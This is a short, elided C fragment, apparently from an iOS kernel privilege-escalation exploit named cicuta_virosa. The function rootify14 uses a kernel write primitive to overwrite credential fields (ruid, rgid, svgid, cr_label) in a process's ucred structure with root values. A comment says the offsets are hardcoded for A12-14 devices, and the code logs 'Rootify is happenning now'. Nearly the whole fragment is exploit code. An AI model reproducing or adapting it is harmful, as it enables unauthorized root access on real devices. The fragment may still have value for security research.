...
uint64_t rootify14(uint64_t ucred_proc){
    ...
    write_20(ucred_proc + 0x68,  (void*)creds); //rgid
    
    sleep(1);
    cicuta_log("....\n");
    write_20(ucred_proc + 0x1c, (void*)creds); //ruid
    sleep(1);
    write_20(ucred_proc + 0x6c, (void*)creds); //svgid
    cicuta_log("\n.\n");
    write_20(ucred_proc + 0x78, (void*)creds); // cr_label
...
uint64_t cicuta_virosa(void) {
   ...
   // offsets is hardcoded for A12-14!!! Change it for your device!!!
       ...
       uint32_t creds[5] = {0, 0, 0, 1, 0};
    cicuta_log("Rootify is happenning now...");
